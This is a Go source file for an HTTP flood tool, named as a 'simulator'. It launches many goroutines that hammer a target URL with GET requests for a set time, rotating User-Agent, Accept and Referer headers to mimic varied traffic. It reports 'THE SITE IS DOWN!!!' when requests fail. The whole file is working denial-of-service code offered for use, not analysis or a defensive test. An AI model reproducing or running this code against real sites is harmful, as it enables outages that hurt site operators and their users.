package floodsimulator

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

type Flooder interface {
	Start()
	Stop()
	SetWorkerAmount(workers uint16)
	SetDuration(seconds uint32)
}

type flooder struct {
	url          string
	client       *http.Client
	workerAmount uint16
	stopSignal   chan struct{}
	startSignal  chan struct{}
	duration     time.Duration
	wg           sync.WaitGroup
}

func NewFlooder(url string, workerAmount uint16, duration uint32) Flooder {
	return &flooder{
		url:          url,
		workerAmount: workerAmount,
		client:       http.DefaultClient,
		stopSignal:   make(chan struct{}),
		startSignal:  make(chan struct{}),
		duration:     time.Duration(duration) * time.Second,
	}
}

func (f *flooder) Start() {
	f.launchWorkers()
	f.waitForUserConfirmation()
	f.startFlooding()
}

func (f *flooder) launchWorkers() {
	for i := uint16(0); i < f.workerAmount; i++ {
		time.Sleep(100 * time.Microsecond)
		f.wg.Add(1)
		go f.worker()
		fmt.Printf("\rThreads [%d] are ready", i+1)
		os.Stdout.Sync()
	}
	fmt.Println()
}

func (f *flooder) waitForUserConfirmation() {
	fmt.Print("Press [Enter] to continue")
	if _, err := bufio.NewReader(os.Stdin).ReadString('\n'); err != nil {
		log.Printf("Error reading input: %v\n", err)
		return
	}
}

func (f *flooder) startFlooding() {
	fmt.Printf("Flood will end in %s seconds.\n", f.duration.String())

	close(f.startSignal)

	timer := time.NewTimer(f.duration)
	defer timer.Stop()

	<-timer.C
	f.Stop()
}

func (f *flooder) worker() {
	defer f.wg.Done()

	for {
		select {
		case <-f.stopSignal:
			return
		case <-f.startSignal:
			f.sendRequest()
		}
	}
}

func (f *flooder) sendRequest() {
	request := f.createRequest()

	resp, err := f.client.Do(request)
	if err == nil {
		defer resp.Body.Close()
		_, err := io.Copy(io.Discard, resp.Body)
		if err != nil {
			log.Printf("Error discarding response body: %v\n", err)
		}
	} else {
		log.Printf("THE SITE IS DOWN!!! --> ERROR MSG: %v\n", err)
	}
}

func (f *flooder) createRequest() *http.Request {
	request, err := http.NewRequest(http.MethodGet, f.url, nil)
	if err != nil {
		log.Fatal(err)
	}

	userAgent := getUserAgent()
	accept := acceptall[rand.Intn(len(acceptall))]
	referer := referers[rand.Intn(len(referers))]

	headers := fmt.Sprintf("Connection: Keep-Alive\nCache-Control: max-age=0\nUser-Agent: %s\n%s\n%s", userAgent, accept, referer)

	f.addHeaders(headers, request)

	return request
}

func (f *flooder) addHeaders(headers string, request *http.Request) {
	for _, pair := range strings.Split(headers, "\n") {
		parts := strings.SplitN(pair, ": ", 2)
		if len(parts) == 2 {
			request.Header.Add(parts[0], parts[1])
		}
	}
}

func (f *flooder) Stop() {
	close(f.stopSignal)
	f.wg.Wait()
}

func (f *flooder) SetWorkerAmount(workers uint16) {
	f.workerAmount = workers
}

func (f *flooder) SetDuration(seconds uint32) {
	f.duration = time.Duration(seconds) * time.Second
}
